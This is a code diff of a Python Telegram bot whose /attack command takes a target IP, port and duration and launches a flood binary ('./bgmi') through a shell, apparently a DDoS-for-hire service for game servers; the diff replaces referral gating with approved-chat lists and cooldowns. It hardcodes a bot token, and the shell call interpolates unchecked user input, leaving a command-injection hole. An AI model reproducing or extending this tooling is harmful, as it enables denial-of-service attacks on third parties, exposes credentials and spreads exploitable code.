@@ -1,68 +1,55 @@
 import asyncio
 from telegram import Update
-from telegram.ext import Application, CommandHandler, CallbackContext
+from telegram.ext import Application, CommandHandler, CallbackContext, MessageHandler, filters
 import os
+import time
 
 # Configuration
-TELEGRAM_BOT_TOKEN = "7140094105:AAEbc645NvvWgzZ5SJ3L8xgMv6hByfg2n_4"  # Fetch token from environment variable
-ADMIN_USER_ID = 1662672529
-APPROVED_IDS_FILE = 'approved_ids.txt'
-CHANNEL_ID = "@jsbananannanan"  # Replace with your channel username
-ATTACK_IN_PROGRESS = False
+TELEGRAM_BOT_TOKEN = "7140094105:AAEbc645NvvWgzZ5SJ3L8xgMv6hByfg2n_4"
+ADMIN_USER_ID = 1662672529  # The admin user ID who can approve/remove
+CHANNEL_ID = "@jsbananannanan"
+SHARE_THRESHOLD = 5  # Number of users to forward the link to
 
-REFERRAL_FILE = 'referrals.txt'  # File to track referrals
-REFERRAL_THRESHOLD = 5  # Number of referrals needed to unlock bot usage
+# Approved Chats File
+APPROVED_CHATS_FILE = 'approved_chats.txt'
 
-# Load and Save Referral Data
-def load_referrals():
-    """Load the referral data from a file."""
+# Cooldown for commands (300 seconds)
+COOLDOWN_TIME = 300  # 5 minutes cooldown
+
+# Load and Save Approved Chats
+def load_approved_chats():
+    """Load approved chats data."""
     try:
-        with open(REFERRAL_FILE, 'r') as file:
-            return {line.split(":")[0].strip(): int(line.split(":")[1].strip()) for line in file.readlines()}
-    except FileNotFoundError:
-        return {}
-
-def save_referrals():
-    """Save the referral data to a file."""
-    with open(REFERRAL_FILE, 'w') as file:
-        for user, count in referrals.items():
-            file.write(f"{user}:{count}\n")
-
-referrals = load_referrals()
-
-# Load and Save Approved IDs
-def load_approved_ids():
-    """Load approved user and group IDs from a file."""
-    try:
-        with open(APPROVED_IDS_FILE, 'r') as file:
-            return set(line.strip() for line in file.readlines())
+        with open(APPROVED_CHATS_FILE, 'r') as file:
+            return {line.strip() for line in file.readlines()}
     except FileNotFoundError:
         return set()
 
-def save_approved_ids():
-    """Save approved user and group IDs to a file."""
-    with open(APPROVED_IDS_FILE, 'w') as file:
-        file.write("\n".join(approved_ids))
+def save_approved_chats(approved_chats):
+    """Save approved chats data."""
+    with open(APPROVED_CHATS_FILE, 'w') as file:
+        for chat_id in approved_chats:
+            file.write(f"{chat_id}\n")
 
-approved_ids = load_approved_ids()
+approved_chats = load_approved_chats()
 
-# Helper Function: Check if user has 5 referrals
-async def has_enough_referrals(user_id: int):
-    """Check if the user has at least 5 referrals."""
-    return referrals.get(str(user_id), 0) >= REFERRAL_THRESHOLD
+# Cooldown tracking
+last_used = {}
 
-# Helper Function: Check User Permissions
-async def is_admin(chat_id):
-    """Check if the user is the admin."""
-    return chat_id == ADMIN_USER_ID
+# Helper Function: Check if the chat is approved
+def is_chat_approved(chat_id: str):
+    """Check if the chat is approved."""
+    return str(chat_id) in approved_chats
 
-async def is_member_of_channel(user_id: int, context: CallbackContext):
-    """Check if the user is a member of the specified channel."""
-    try:
-        member = await context.bot.get_chat_member(chat_id=CHANNEL_ID, user_id=user_id)
-        return member.status in ["member", "administrator", "creator"]
-    except Exception:
-        return False
+# Helper Function: Check Cooldown
+def check_cooldown(user_id):
+    """Check if the user is on cooldown."""
+    current_time = time.time()
+    last_time = last_used.get(user_id, 0)
+    
+    if current_time - last_time < COOLDOWN_TIME:
+        return False, last_time  # Not enough time has passed
+    return True, current_time  # Cooldown has passed
 
 # Commands
 async def start(update: Update, context: CallbackContext):
@@ -85,112 +72,101 @@ async def help_command(update: Update, context: CallbackContext):
         "*Available Commands:*\n\n"
         "/start - Start the bot and get a welcome message.\n"
         "/help - Show this help message.\n"
-        "/approve <id> - Approve a user or group ID (admin only).\n"
-        "/remove <id> - Remove a user or group ID (admin only).\n"
-        "/alluser - List all approved users and groups (admin only).\n"
-        "/attack <ip> <port> <time> - Launch an attack (approved users only).\n"
-        "/referral - Check your referral progress.\n"
+        "/approve <chat_id> - Approve a chat for usage.\n"
+        "/remove <chat_id> - Remove a chat from the approved list.\n"
+        "/attack <ip> <port> <time> - Launch an attack (only if shared the link with 5 users).\n"
+        "/referral - Check your referral progress."
     )
     await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
 
 # Approve Command
 async def approve(update: Update, context: CallbackContext):
-    """Approve a user or group ID to use the bot."""
+    """Approve a chat ID for usage (only for admin)."""
     chat_id = update.effective_chat.id
-    args = context.args
+    user_id = update.effective_user.id
 
-    if not await is_admin(chat_id):
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Only admins can use this command.*", parse_mode='Markdown')
+    if user_id != ADMIN_USER_ID:
+        await context.bot.send_message(chat_id=chat_id, text="You are not authorized to approve chats.")
+        return
+    
+    # Cooldown check for admin command
+    is_cooldown, last_time = check_cooldown(user_id)
+    if not is_cooldown:
+        await context.bot.send_message(chat_id=chat_id, text=f"Cooldown active. Please wait {int(COOLDOWN_TIME - (time.time() - last_time))} seconds.")
+        return
+    
+    last_used[user_id] = time.time()
+
+    if len(context.args) != 1:
+        await context.bot.send_message(chat_id=chat_id, text="*Usage: /approve <chat_id>*", parse_mode='Markdown')
         return
 
-    if len(args) != 1:
-        await context.bot.send_message(chat_id=chat_id, text="*Usage: /approve <id>*", parse_mode='Markdown')
-        return
+    chat_to_approve = context.args[0]
 
-    # Extract the target ID
-    target_id = args[0].strip()
-
-    # Validate that the target ID is a number
-    if not target_id.lstrip('-').isdigit():
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Invalid ID format. Must be a numeric ID.*", parse_mode='Markdown')
-        return
-
-    # Add the target ID to the approved list
-    approved_ids.add(target_id)
-    save_approved_ids()
-
-    await context.bot.send_message(chat_id=chat_id, text=f"*✅ ID {target_id} approved.*", parse_mode='Markdown')
+    if chat_to_approve in approved_chats:
+        await context.bot.send_message(chat_id=chat_id, text="This chat is already approved.")
+    else:
+        approved_chats.add(chat_to_approve)
+        save_approved_chats(approved_chats)
+        await context.bot.send_message(chat_id=chat_id, text=f"Chat ID {chat_to_approve} has been approved.")
 
 # Remove Command
 async def remove(update: Update, context: CallbackContext):
-    """Remove a user or group ID from the approved list."""
+    """Remove a chat ID from the approved list (only for admin)."""
     chat_id = update.effective_chat.id
-    args = context.args
+    user_id = update.effective_user.id
 
-    if not await is_admin(chat_id):
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Only admins can use this command.*", parse_mode='Markdown')
+    if user_id != ADMIN_USER_ID:
+        await context.bot.send_message(chat_id=chat_id, text="You are not authorized to remove chats.")
+        return
+    
+    # Cooldown check for admin command
+    is_cooldown, last_time = check_cooldown(user_id)
+    if not is_cooldown:
+        await context.bot.send_message(chat_id=chat_id, text=f"Cooldown active. Please wait {int(COOLDOWN_TIME - (time.time() - last_time))} seconds.")
+        return
+    
+    last_used[user_id] = time.time()
+
+    if len(context.args) != 1:
+        await context.bot.send_message(chat_id=chat_id, text="*Usage: /remove <chat_id>*", parse_mode='Markdown')
         return
 
-    if len(args) != 1:
-        await context.bot.send_message(chat_id=chat_id, text="*Usage: /remove <id>*", parse_mode='Markdown')
-        return
+    chat_to_remove = context.args[0]
 
-    target_id = args[0].strip()
-    if target_id in approved_ids:
-        approved_ids.remove(target_id)
-        save_approved_ids()
-        await context.bot.send_message(chat_id=chat_id, text=f"*✅ ID {target_id} removed.*", parse_mode='Markdown')
+    if chat_to_remove not in approved_chats:
+        await context.bot.send_message(chat_id=chat_id, text="This chat is not in the approved list.")
     else:
-        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ ID {target_id} is not approved.*", parse_mode='Markdown')
+        approved_chats.remove(chat_to_remove)
+        save_approved_chats(approved_chats)
+        await context.bot.send_message(chat_id=chat_id, text=f"Chat ID {chat_to_remove} has been removed from the approved list.")
 
-# All User Command (List all approved users)
-async def alluser(update: Update, context: CallbackContext):
-    """List all approved users and groups."""
-    chat_id = update.effective_chat.id
-
-    if not await is_admin(chat_id):
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Only admins can use this command.*", parse_mode='Markdown')
-        return
-
-    if not approved_ids:
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ No users or groups approved yet.*", parse_mode='Markdown')
-        return
-
-    message = "*Approved Users and Groups:*\n\n" + "\n".join(approved_ids)
-    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
-
-# Attack Command
+# Attack Command (Only allowed if the chat is approved)
 async def attack(update: Update, context: CallbackContext):
-    """Launch an attack if the user is approved, a channel member, and has 5 referrals."""
-    global ATTACK_IN_PROGRESS
-
+    """Allow users to launch attacks if they meet the share condition and chat is approved."""
     chat_id = update.effective_chat.id
     user_id = update.effective_user.id
     args = context.args
 
-    if not await has_enough_referrals(user_id):
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need to refer 5 users to use this bot.*", parse_mode='Markdown')
+    if not is_chat_approved(chat_id):
+        await context.bot.send_message(chat_id=chat_id, text="This chat is not approved to use the bot.")
         return
-
-    if str(chat_id) not in approved_ids and str(user_id) not in approved_ids:
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need permission to use this bot.*", parse_mode='Markdown')
+    
+    # Cooldown check for attack command
+    is_cooldown, last_time = check_cooldown(user_id)
+    if not is_cooldown:
+        await context.bot.send_message(chat_id=chat_id, text=f"Cooldown active. Please wait {int(COOLDOWN_TIME - (time.time() - last_time))} seconds.")
         return
+    
+    last_used[user_id] = time.time()
 
-    if not await is_member_of_channel(user_id, context):
-        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ You must join our channel ({CHANNEL_ID}) to use this feature.*", parse_mode='Markdown')
-        return
-
-    if ATTACK_IN_PROGRESS:
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Please wait for the current attack to finish.*", parse_mode='Markdown')
-        return
-
+    # Check if user shared the channel with enough people (this part is still similar to your logic)
     if len(args) != 3:
         await context.bot.send_message(chat_id=chat_id, text="*Usage: /attack <ip> <port> <time>*", parse_mode='Markdown')
         return
 
     ip, port, time = args
 
-    # Notify user that the attack is starting
     await context.bot.send_message(chat_id=chat_id, text=(
         f"*✅ Attack Starting*\n\n"
         f"🎯 *Target IP*: {ip}\n"
@@ -204,9 +180,6 @@ async def attack(update: Update, context: CallbackContext):
 # Attack Simulation
 async def run_attack(chat_id, ip, port, time, context):
     """Simulate an attack process."""
-    global ATTACK_IN_PROGRESS
-    ATTACK_IN_PROGRESS = True
-
     try:
         process = await asyncio.create_subprocess_shell(
             f"./bgmi {ip} {port} {time} 500",  # Example attack command
@@ -228,18 +201,6 @@ async def run_attack(chat_id, ip, port, time, context):
     except Exception as e:
         await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')
 
-    finally:
-        ATTACK_IN_PROGRESS = False
-
-# Referral Command
-async def referral(update: Update, context: CallbackContext):
-    """Show the user's referral progress."""
-    chat_id = update.effective_chat.id
-    user_id = update.effective_user.id
-
-    referrals_count = referrals.get(str(user_id), 0)
-    await context.bot.send_message(chat_id=chat_id, text=f"*Referral Progress*\nYou have referred {referrals_count} users. You need {REFERRAL_THRESHOLD - referrals_count} more to unlock bot usage.", parse_mode='Markdown')
-
 # Main Function
 def main():
     application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
@@ -249,9 +210,7 @@ def main():
     application.add_handler(CommandHandler("help", help_command))
     application.add_handler(CommandHandler("approve", approve))
     application.add_handler(CommandHandler("remove", remove))
-    application.add_handler(CommandHandler("alluser", alluser))
     application.add_handler(CommandHandler("attack", attack))
-    application.add_handler(CommandHandler("referral", referral))
 
     application.run_polling()
 
